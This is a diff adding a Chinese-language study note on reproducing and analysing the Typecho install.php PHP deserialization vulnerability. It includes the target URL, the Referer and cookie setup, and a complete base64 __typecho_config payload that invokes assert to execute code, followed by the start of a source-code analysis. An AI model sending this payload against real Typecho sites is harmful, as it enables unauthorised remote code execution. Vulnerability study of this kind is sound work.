@@ -76,7 +76,33 @@ php中通过两个函数即可实相对象的序列化（serialize）和反序�
     }
     ```
 
+## Typecho 反序列化漏洞复现
+
+访问install.php
+
+```text
+http://IP/typecho/install.php?finish
+```
+
+使用hackbar,将Referrer设置为IP地址，将Cookies设置为以下值，并发送数据包：
+
+```text
+__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo1OntzOjU6InRpdGxlIjtzOjE6IjEiO3M6NDoibGluayI7czoxOiIxIjtzOjQ6ImRhdGUiO2k6MTUwODg5NTEzMjtzOjg6ImNhdGVnb3J5IjthOjE6e2k6MDtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fXM6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6ODoidHlwZWNob18iO30=
+```
+
+![&#x4EFB;&#x610F;&#x4EE3;&#x7801;&#x6267;&#x884C;](https://p408.ssl.qhimgs4.com/t012be0b81b95d1a5b6.png)
+
+可以看到任意代码执行。
+
+## Typecho漏洞分析
+
+1.漏洞的入口位置在install.php的第232行  
 
 
+![](../.gitbook/assets/image%20%284%29.png)
 
+  
+当存在cookie名为\_\_typecho\_config时，会将该值base64解码后进反序列化，并将反序列化后的对象赋给$config变量。然后将该cookie删除。第三步按config中的adapter和prefix的值建立Typecho\_Db对象。那么看一下Typecho\_Db的构造函数
+
+![](../.gitbook/assets/image%20%288%29.png)
 
